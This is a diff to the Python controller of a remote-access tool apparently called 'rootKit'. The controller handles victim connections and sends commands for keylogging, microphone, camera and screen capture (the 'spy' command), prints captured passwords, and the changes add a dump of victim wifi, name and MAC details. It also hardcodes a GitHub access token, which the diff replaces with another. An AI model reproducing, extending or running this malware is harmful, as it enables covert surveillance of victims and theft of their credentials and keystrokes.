@@ -23,7 +23,7 @@ def connected():
         return False
 if getSelfIp() not in("192.168.249.97") and connected():
     # First create a Github instance:
-    g = Github("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")
+    g = Github("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")
     # Then play with your Github objects:
     # for repo in g.get_user().get_repos():
     #     print(repo.name)
@@ -42,6 +42,56 @@ else:
 
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 reset, sendAndReceive, mythreads, threadConnected, listenIp = attr(0), [], [], [], False
+
+class Setup():
+    def __init__(self):
+        self.file = "setup.txt"
+        try:
+            with open(self.file, "r"):
+                pass
+        except:
+            with open(self.file, "w") as file:
+                file.write("material speed\nhigh\ninternet speed\nhigh")
+        self.changeValue()
+        
+    def changeValue(self):
+        with open(self.file, "r") as file:
+            sort = file.read().split("\n")
+            if sort[1] == "low":
+                self.setupMultipliersMaterial = 2
+            elif sort[1] == "medium":
+                self.setupMultipliersMaterial = 1.5
+            elif sort[1] == "high":
+                self.setupMultipliersMaterial = 1
+            elif sort[1] == "xl-high":
+                self.setupMultipliersMaterial = 0.5
+            if sort[3] == "low":
+                self.setupConnexionSpeed = 2
+            elif sort[3] == "medium":
+                self.setupConnexionSpeed = 1.5
+            elif sort[3] == "high":
+                self.setupConnexionSpeed = 1
+            elif sort[3] == "xl-high":
+                self.setupConnexionSpeed = 0.5
+    def changeConfig(self, material=None, internet=None):
+        with open(self.file, 'r') as file:
+            sort = file.read().split("\n")
+            tempSpeedMaterial = sort[1]
+            tempSpeedConnexion = sort[3]
+        with open(self.file, "w") as file:
+            if material in ("low", "medium", "high", "xl-high"):
+                tempSpeedMaterial = material
+            if internet in ("low", "medium", "high", "xl-high"):
+                tempSpeedConnexion = internet
+            file.write("material speed\n"+tempSpeedMaterial+"\ninternet speed\n"+tempSpeedConnexion)
+    def GetSpeedMaterialMultiplier(self):
+        return self.setupMultipliersMaterial
+    def GetSpeedInternetMultiplier(self):
+        return self.setupConnexionSpeed
+
+setup = Setup()
+print(setup.GetSpeedMaterialMultiplier())
+print(setup.GetSpeedInternetMultiplier())
 
 class Microphone(threading.Thread):
     def __init__(self, ip, port):
@@ -91,17 +141,16 @@ class Microphone(threading.Thread):
 class myThread(threading.Thread):
     def __init__(self,ip,port, ID, con, init): 
         threading.Thread.__init__(self)
-        INIT = {}
+        self.INIT = {}
         for i in range(0, len(init), 2):
-            INIT[init[i]] = init[i+1]
-        # print(INIT)
+            self.INIT[init[i]] = init[i+1]
         self.micIsAlive = False
         self.screen = False
         self.camera = False
         self.linked = False
-        self.wifi = INIT['wifi']
-        self.name = INIT['name']
-        self.macAddress = INIT['mac']
+        self.wifi = self.INIT['wifi']
+        self.name = self.INIT['name']
+        self.macAddress = self.INIT['mac']
         self.con = con
         self.ID = ID
         self.ip = ip 
@@ -146,12 +195,14 @@ class myThread(threading.Thread):
                 print(f"le mdp de {line.split(';-;')[0]} est {line.split(';-;')[1]}")
             except:
                 pass
+    def showInitInfo(self):
+        return self.INIT
     def currentThread(self, thread):
         self.currentthread = thread
     def send(self, data):
         data.replace("9", "8+1")
         self.con.sendall(data.encode())
-        sleep(0.05)
+        sleep(0.05*setup.GetSpeedInternetMultiplier())
     def stop(self):
         self.Stop = True
     def getCon(self):
@@ -293,7 +344,7 @@ def MainThread():
     while getattr(mainThread, "do_run", True):
         try:
             ID+=1
-            s.settimeout(1)
+            s.settimeout(1*setup.GetSpeedInternetMultiplier()*setup.GetSpeedMaterialMultiplier())
             s.listen(1) 
             # print("Serveur: en attente de connexions des clients TCP ...")
             (con, (ip,port)) = s.accept()
@@ -402,7 +453,7 @@ def threadingSendAndReceive(dataToSend, ip, port, thread):
         rest=False
     if rest:
         try:
-            thread.getCon().settimeout(4)
+            thread.getCon().settimeout(4*setup.GetSpeedInternetMultiplier())
             print(thread.getCon().recv(64000))
         except:
             print(f'no return in {ip}:{port}')
@@ -416,7 +467,7 @@ def runThreadingSendAndReceive(data):
         t.daemon = True
         t.start()
         loop+=1
-    sleep(5)
+    sleep(5*setup.GetSpeedInternetMultiplier())
 
 def testIfIpTrue(data, total=False):
     if total == False:
@@ -441,7 +492,7 @@ def restart(timeout=2):
             thread.send('left')
         except:
             pass
-    sleep(timeout)
+    sleep(timeout*setup.GetSpeedInternetMultiplier())
     mainThread = threading.Thread(target=MainThread)
     mainThread.daemon = True
     mainThread.start()
@@ -517,7 +568,7 @@ def printSocketCo():
         print()
         print()
         command('list')
-        sleep(2)
+        sleep(3*setup.GetSpeedMaterialMultiplier())
 def testin(data, *cmd):
     for command in cmd:
         if data == command:
@@ -533,7 +584,7 @@ def displayContinueSocket(stop):
         for con in getConnected.getCon():
             try:
                 if not pause:
-                    con.settimeout(0.01)
+                    con.settimeout(0.01*setup.GetSpeedInternetMultiplier())
                     receive = con.recv(5).decode()
                     if receive:
                         delete = 0
@@ -806,15 +857,15 @@ def sendData(data, RETURN=False):
                 micStop(reload=True)
             elif testin(data, "spy"):
                 sendData("startmic")
-                sleep(0.5)
+                sleep(0.5*setup.GetSpeedInternetMultiplier())
                 sendData("cameraStart")
-                sleep(0.5)
+                sleep(0.5*setup.GetSpeedInternetMultiplier())
                 sendData("screenStart")
             elif testin(data, 'spyStop'):
                 sendData("micStop")
-                sleep(0.5)
+                sleep(0.5*setup.GetSpeedInternetMultiplier())
                 sendData("cameraStop")
-                sleep(0.5)
+                sleep(0.5*setup.GetSpeedInternetMultiplier())
                 sendData("screenStop")
             elif testin(datalist[0], "fasttap", "fastTap", "tapfast", "tapFast"):
                 datalist.pop(0)
@@ -837,10 +888,6 @@ def sendData(data, RETURN=False):
                     sendData(datalist[i])
                 Send = True
                 send("severalcontrol "+addvar)
-                # while data != "ok":
-                #     SocketCo.settimeout(3)
-                #     data = (SocketCo.recv(ceil(32768))).decode()
-                #     print(data)
             elif testin(data, "listenKeylogger"):
                 send("listenKeyloggerTrue")
                 stop_display_continue_socket = False
@@ -862,6 +909,11 @@ def sendData(data, RETURN=False):
                 send("listenKeyloggerFalse")
                 stop_display_continue_socket = True
                 threadingDisplayAll.join()
+            elif testin(data, "showInitInfo"):
+                for thread in getConnected.getCurrentThreads():
+                    # print(thread.getName()+": "+thread.showInitInfo())
+                    for key in thread.showInitInfo().keys():
+                        print(key+": "+thread.showInitInfo()[key])
             else:
                 runThreadingSendAndReceive(data)
         except Exception as e:
@@ -899,7 +951,7 @@ def micStop(MYTHREADS=mythreads, reload=False):
             # print('mic stop')
         except:
             pass
-        sleep(0.2)
+        sleep(0.2*setup.GetSpeedInternetMultiplier())
         if reload:
             try:
                 thread.micStart(thread.getPortMic())
